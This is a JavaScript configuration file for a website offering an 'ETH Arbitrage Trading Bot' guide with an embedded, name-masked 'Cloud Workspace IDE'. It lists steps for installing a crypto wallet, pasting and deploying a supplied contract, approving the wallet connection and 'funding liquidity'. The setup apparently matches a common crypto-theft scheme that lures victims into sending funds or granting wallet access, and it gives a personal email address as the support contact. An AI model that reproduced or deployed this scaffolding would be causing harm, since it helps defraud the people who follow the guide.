/** Site configuration — installation steps point only to this website */
window.SITE_CONFIG = {
  guide: {
    title: "ETH Arbitrage Trading Bot - Full Guide",
    contactEmail: "leslie.magwaza@gmail.com",
    contactLabel: "Contact support",
    devSiteLabel: "Open Cloud Workspace",
    sourceHeading: "Smart contract source (paste into workspace)",
    compilerVersion: "0.8.4",
  },
  urls: {
    /** Shown in guide copy; resolved to current host at runtime */
    siteMask: "this website",
    ideMask: "Cloud Workspace IDE",
  },
  routes: {
    guide: "/",
    ideQuery: "view=ide",
  },
  guideSteps: [
    "Install a Web3 wallet browser extension (MetaMask, Trust Wallet, Coinbase Wallet, or Phantom with Ethereum enabled) on the same browser you will use for the bot.",
    "Return to this website and open the Cloud Workspace using the link below — do not use third-party download pages or mirror sites.",
    "In the Files tab, create a new file with a single-word name (for example bot or gateway).",
    "Paste the contract source from this guide into your new file, or use the included project/bot.py for the Python arbitrage runtime.",
    "Open the Compile tab, enable Cache dependencies if needed, and run Compile & Build until the terminal shows Compilation and build completed successfully.",
    "Open the Deploy tab, deploy to the Cloud Workspace, then click load_smart_contract_gateway() and approve the wallet connection prompt.",
    "After your wallet connects, open the live Etherscan link for the Loaded Smart-Contract Gateway, fund liquidity if required, then use start_bot() and withdraw_liquidity() from the callable functions panel.",
  ],
};

window.SITE_MASK_DISPLAY = window.SITE_CONFIG.urls.siteMask;
window.IDE_MASK_DISPLAY = window.SITE_CONFIG.urls.ideMask;
window.IDE_PAGE_URL = "open/embed.html";
window.IDE_OPEN_IN_NEW_TAB = false;
window.IDE_ENTRY_SESSION_KEY = "dos_spaces_dev_entry";
window.IDE_ENTRY_QUERY_PARAM = "dev";
window.GUIDE_HOME_URL = "index.html";
